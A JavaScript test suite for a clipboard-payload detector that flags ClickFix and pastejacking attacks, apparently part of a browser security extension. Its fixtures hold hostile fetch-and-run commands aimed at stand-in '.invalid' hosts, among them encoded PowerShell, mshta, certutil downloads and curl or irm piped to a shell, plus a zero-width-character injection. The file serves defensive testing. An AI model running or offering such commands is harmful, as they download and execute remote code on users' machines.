import test from "node:test";
import assert from "node:assert/strict";
import { analyzeClipboardPayload, sanitizeExcerpt } from "../lib/clickfix.js";

test("EXT-01: detects LOTL ClickFix command indicators", () => {
  const cases = [
    {
      name: "powershell -enc",
      text: "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAGkAcgBtACAAaAB0AHQAcABzADoALwAvAGUAdgBpAGwALgBpAG4AdgBhAGwAaQBkAC8AcAApAA==",
      expected: ["powershell_exec", "encoded_command"],
    },
    {
      name: "cmd /c",
      text: "cmd /c powershell -c Invoke-WebRequest https://evil.localedr.invalid/a.ps1",
      expected: ["powershell_exec", "cmd_exec"],
    },
    {
      name: "mshta remote",
      text: "mshta https://verify.localedr.invalid/captcha.hta",
      expected: ["mshta_exec"],
    },
    {
      name: "certutil urlcache",
      text: "certutil -urlcache -split -f https://dl.localedr.invalid/p.exe %TEMP%\\p.exe",
      expected: ["certutil_abuse"],
    },
    {
      name: "curl piped to shell",
      text: "curl -fsSL https://sh.localedr.invalid/install.sh | bash",
      expected: ["curl_wget_pipe_shell"],
    },
    {
      name: "irm piped to iex",
      text: "irm https://ps.localedr.invalid/run | iex",
      expected: ["iex_eval"],
    },
  ];

  for (const tc of cases) {
    const res = analyzeClipboardPayload({
      copiedText: tc.text,
      selectionText: "",
      trigger: "writeText",
    });
    assert.equal(res.suspicious, true, `expected ${tc.name} to trigger`);
    assert.equal(res.severity, "high");
    for (const ind of tc.expected) {
      assert.ok(
        res.indicators.includes(ind),
        `${tc.name} missing indicator ${ind}; got ${JSON.stringify(res.indicators)}`
      );
    }
  }
});

test("EXT-02: detects invisible BiDi/control characters and trailing newline injection", () => {
  const withZeroWidth = analyzeClipboardPayload({
    copiedText: "git status\u200B && whoami",
    selectionText: "",
    trigger: "writeText",
  });
  assert.equal(withZeroWidth.suspicious, true);
  assert.ok(withZeroWidth.indicators.includes("hidden_control_chars"));
  assert.ok(sanitizeExcerpt("abc\u202Edef").includes("[U+202E]"));

  const withTrailingNewlineClickFix = analyzeClipboardPayload({
    copiedText: "mshta https://verify.localedr.invalid/check.hta # Human verification\n",
    selectionText: "",
    trigger: "writeText",
  });
  assert.equal(withTrailingNewlineClickFix.suspicious, true);
  assert.ok(withTrailingNewlineClickFix.indicators.includes("mshta_exec"));
  assert.ok(withTrailingNewlineClickFix.indicators.includes("trailing_newline_injection"));

  const copyNewlineInjected = analyzeClipboardPayload({
    copiedText: "echo hello\n",
    selectionText: "echo hello",
    trigger: "copy",
  });
  assert.equal(copyNewlineInjected.suspicious, true);
  assert.ok(copyNewlineInjected.indicators.includes("trailing_newline_injection"));
});

test("EXT-03: detects Pastejacking when copied text mismatches DOM selection", () => {
  const hijacked = analyzeClipboardPayload({
    copiedText: "curl https://evil.localedr.invalid/s.sh | sh",
    selectionText: "npm run build",
    trigger: "copy",
  });
  assert.equal(hijacked.suspicious, true);
  assert.equal(hijacked.selectionMismatch, true);
  assert.ok(hijacked.indicators.includes("selection_mismatch"));
  assert.ok(hijacked.indicators.includes("curl_wget_pipe_shell"));

  // Benign mismatch (e.g. non-LOTL replacement on copy) is still flagged under L-15
  const plainMismatch = analyzeClipboardPayload({
    copiedText: "unexpected-replacement",
    selectionText: "expected-snippet",
    trigger: "copy",
  });
  assert.equal(plainMismatch.suspicious, true);
  assert.equal(plainMismatch.selectionMismatch, true);
  assert.deepEqual(plainMismatch.indicators, ["selection_mismatch"]);
});

test("EXT-04: avoids false positives on normal developer copies and benign Copy buttons", () => {
  const safeCases = [
    {
      copiedText: "const answer = 42;\nconsole.log(answer);",
      selectionText: "const answer = 42;\r\nconsole.log(answer);",
      trigger: "copy",
    },
    {
      copiedText: "cargo test --workspace --locked",
      selectionText: "cargo test --workspace --locked",
      trigger: "copy",
    },
    {
      copiedText: "How to use PowerShell in Windows Terminal",
      selectionText: "How to use PowerShell in Windows Terminal",
      trigger: "copy",
    },
    {
      copiedText: "npm install @scope/package --save-dev\n",
      selectionText: "",
      trigger: "writeText",
    },
    {
      copiedText: "const iex = 123;\n",
      selectionText: "",
      trigger: "writeText",
    },
  ];

  for (const tc of safeCases) {
    const res = analyzeClipboardPayload(tc);
    assert.equal(
      res.suspicious,
      false,
      `unexpected false positive for ${JSON.stringify(tc)}: ${JSON.stringify(res)}`
    );
    assert.equal(res.severity, "none");
    assert.deepEqual(res.indicators, []);
  }
});
